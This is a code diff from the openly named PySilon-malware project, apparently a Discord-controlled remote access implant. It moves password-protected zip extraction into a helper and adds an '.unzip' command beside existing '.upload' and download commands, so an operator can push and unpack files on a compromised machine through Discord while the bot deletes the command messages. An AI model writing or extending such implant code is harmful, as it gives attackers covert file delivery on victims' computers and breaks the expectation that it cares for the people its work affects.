@@ -36,6 +36,29 @@ async def file_downloading(ctx, file_to_download=None):
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
 
+async def unzip(ctx, file):
+    archive_password = None 
+
+    def get_archive_pass(m):
+        return m.content and m.channel == ctx.channel
+    
+    try:
+        with ZipFile(file) as zip_file:
+            embed = discord.Embed(title='🔴 Hold on!', description='```This zip file is password protected.\n\nPlease send the password here.```', colour=discord.Colour.red())
+            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
+            
+            try: zip_file.testzip()
+            except: await ctx.send(embed=embed); archive_password = await client.wait_for('message', check=get_archive_pass); archive_password = archive_password.content
+
+            zip_file.extractall(pwd=archive_password.encode()) if archive_password != None else zip_file.extractall()
+            embed = discord.Embed(title='🟢 Success', description='```The zip file has been successfully extracted.```', colour=discord.Colour.green())
+            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
+            await ctx.send(embed=embed)
+    except:
+        embed = discord.Embed(title='📛 Error', description='Failed to unzip the file.', colour=discord.Colour.red())
+        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
+        return await ctx.send(embed=embed)
+
 @client.command(name='upload')
 async def file_uploading(ctx, argument=None, name_of_file=None):
     await ctx.message.delete()
@@ -51,28 +74,7 @@ async def file_uploading(ctx, argument=None, name_of_file=None):
         try:
             reaction, user = await client.wait_for('reaction_add', check=extract_zipfile_user_confirm)
             if str(reaction.emoji) == '✅':
-                archive_password = None 
-                def get_archive_pass(m):
-                    return m.content and m.channel == ctx.channel
-            
-                try:
-                    with ZipFile(filename) as zip_file:
-                        embed = discord.Embed(title='🔴 Hold on!', description='```This zip file is password protected.\n\nPlease send the password here.```', colour=discord.Colour.red())
-                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
-                        
-                        try: zip_file.testzip()
-                        except: await ctx.send(embed=embed); archive_password = await client.wait_for('message', check=get_archive_pass); archive_password = archive_password.content
-
-                        zip_file.extractall(pwd=archive_password.encode()) if archive_password != None else zip_file.extractall()
-
-                        embed = discord.Embed(title='🟢 Success', description='```The zip file has been successfully extracted.```', colour=discord.Colour.green())
-                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
-                        await ctx.send(embed=embed)
-                except:
-                    embed = discord.Embed(title='📛 Error', description='Failed to unzip the file.', colour=discord.Colour.red())
-                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
-                    return await ctx.send(embed=embed)
-                
+                await unzip(ctx, filename)
         except asyncio.TimeoutError: await ctx.send("```❗ Reaction listener has timed out.```")
 
     if argument == 'small':
@@ -137,3 +139,8 @@ async def file_uploading(ctx, argument=None, name_of_file=None):
         embed = discord.Embed(title="📛 Error",description=f'```Syntax: .upload <small / big>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
+
+@client.command(name="unzip")
+async def unzip_command(ctx, filename):
+    await ctx.message.delete()
+    await unzip(ctx, filename)
